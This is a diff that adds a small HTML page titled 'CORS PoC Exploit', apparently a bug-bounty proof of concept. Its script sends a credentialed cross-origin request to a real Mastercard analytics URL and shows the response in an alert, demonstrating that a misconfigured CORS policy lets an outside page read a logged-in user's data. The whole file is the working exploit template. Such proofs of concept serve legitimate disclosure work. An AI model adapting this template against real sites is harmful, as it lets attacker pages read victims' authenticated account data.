@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+   <head>
+      <script>
+         function cors() {
+	        var xhttp = new XMLHttpRequest();
+		        xhttp.onreadystatechange = function() {
+			        if (this.readyState == 4 && this.status == 200) {
+			        	document.getElementById("emo").innerHTML = alert(this.responseText);
+	        }
+         };
+         xhttp.open("GET", "https://src.mastercard.com/profile/enroll/b/ss/masterc729,masterc196,mastercglobal/1/JS-2.22.0-LBQ1/s2680811796775?AQB=1&ndh=1&pf=1&t=31%2F2%2F2021%2023%3A40%3A5%203%20-330&fid=640BA80020F87EDD-08CE00B38C9711BB&ce=UTF-8&pageName=%2Fprofile%2Fenroll&g=https%3A%2F%2Fsrc.mastercard.com%2Fprofile%2Fenroll&cc=USD&ch=SRC&server=src.mastercard.com&events=event4&c4=D%3Dv4&v4=%2Fprofile%2Fenroll%20%E2%80%93%20Continue%20Button&c10=D%3Dv10&c11=D%3Dv18&v18=US&c28=D%3Dv28&v28=en&c31=D%3Dv31&v31=https%3A%2F%2Fsrc.mastercard.com%2Fprofile%2Fenroll&c37=D%3Dv37&v37=Mastercard%20Click%20to%20Pay%20Profile&c39=D%3Dv39&v39=4f339be7.dec044c0-0f91-4a6f-83de-a693895aae2c&c40=D%3Dv40&v40=false&c41=D%3Dv41&v41=false&c42=D%3Dv42&c43=D%3Dv43&v43=false&c46=D%3Dv46&c50=D%3Dv50&c57=D%3Dv57&v57=e0c3be1a-fcb2-11ea-adc1-0242ac120002&c60=D%3Dv60&c61=D%3Dv61&c63=D%3Dv63&c64=D%3Dv64&c68=D%3Dv68&c69=D%3Dv69&v69=Account%20Management%20-%20Registration&c71=D%3Dv71&v71=https%3A%2F%2Fsrc.mastercard.com%2Fprofile%2Fenroll&c72=D%3Dv72&v72=Mozilla%2F5.0%20%28Macintosh%3B%20Intel%20Mac%20OS%20X%2010.15%3B%20rv%3A78.0%29%20Gecko%2F20100101%20Firefox%2F78.0%20Waterfox%2F78.9.0&c73=D%3Dv73&v73=&c74=D%3Dv74&v74=Click%20-%20Button%20-%20Continue&c75=D%3Dv75&v77=%2Fprofile%2Fenroll&v80=%20undefined&pe=lnk_o&pev2=link%20clicked&c.&a.&activitymap.&page=%2Fprofile%2Fenroll&link=GET%20STARTED&region=BODY&pageIDType=1&.activitymap&.a&.c&pid=%2Fprofile%2Fenroll&pidt=1&oid=GET%20STARTED&oidt=3&ot=SUBMIT&s=1440x900&c=24&j=1.6&v=N&k=Y&bw=1440&bh=743&lrt=1233&AQE=1", true);
+         xhttp.withCredentials = true;
+         xhttp.send();
+         }
+      </script>
+   </head>
+   <body>
+      <center>
+      <h2>CORS PoC Exploit </h2>
+      <h3>created by <a href="https://twitter.com/Jarvis7717">@Jarvis</a></h3>
+      <h3>Show full content of page</h3>
+      <div id="demo">
+         <button type="button" onclick="cors()">Exploit</button>
+      </div>
+   </body>
+</html>
